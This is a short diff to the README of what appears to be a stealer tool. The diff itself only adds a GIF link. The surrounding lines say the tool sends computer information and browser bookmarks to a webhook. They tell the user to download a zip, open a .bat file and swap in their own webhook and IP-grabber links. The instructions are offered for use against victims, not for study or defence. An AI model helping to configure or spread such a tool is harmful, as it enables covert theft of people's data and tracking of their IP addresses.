@@ -11,6 +11,7 @@ and it will send all information to webhook about computer and bookmarks from br
 # download zip
 ![2022-06-23 10-13-28 (3)](https://user-images.githubusercontent.com/98951386/175251579-8d52ef84-d346-4bb5-ba0b-0b53d14ccecb.gif)
 # open .bat in editor
+![2022-06-23 10-22-50](https://user-images.githubusercontent.com/98951386/175252780-07b259ee-f838-4664-ac8c-a09bf5e50f6a.gif)
 # -change webhook in line 5
 # -change your link ip grabber manage in line 42
 # -change your link to ip grabber in line 50
